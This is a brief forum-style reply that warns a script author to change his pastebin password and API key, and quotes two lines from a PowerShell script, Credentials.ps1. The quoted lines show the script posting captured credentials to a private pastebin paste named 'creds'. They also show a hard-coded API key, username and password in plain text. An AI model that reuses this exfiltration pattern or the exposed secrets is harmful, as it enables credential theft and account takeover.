Probably at the least want to change your pastebin password and api key:

>>From Credentials.ps1:

Post_http "http://pastebin.com/api/api_login.php"
"api_dev_key=8e5dbe7c4288c87f41b1e3e2ffce6c25&api_user_name=koshish&api_user_password=nikhilpastebin"

Post_http "http://pastebin.com/api/api_post.php"
"api_user_key=$session_key&api_option=paste&api_dev_key=8e5dbe7c4288c87f41b1e3e2ffce6c25&api_paste_name=creds&api_paste_code=$pastevalue&api_paste_private=2"

"

Cheers,
Harry
